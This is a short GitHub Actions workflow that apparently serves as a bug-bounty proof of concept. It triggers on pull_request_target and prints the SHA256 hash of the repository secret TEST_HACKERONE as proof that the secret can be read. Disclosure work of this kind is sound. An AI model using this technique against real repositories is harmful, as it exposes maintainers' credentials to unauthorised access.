name: PoC Secret Verification
on: pull_request_target

jobs:
  verify-secret:
    runs-on: ubuntu-latest
    steps:
      - name: Verify Secret Access (SHA256)
        run: |
          echo "Generating proof of access for TEST_HACKERONE..."
          
          # Compute the SHA256 hash of the secret.
          # The secret itself never leaves the memory of this command 
          # and is not written to the logs.
          echo -n "${{ secrets.TEST_HACKERONE }}" | sha256sum
          
          echo "Please provide the hash above to the security team."
          echo "They can verify it by running: echo -n 'ACTUAL_VALUE' | sha256sum"
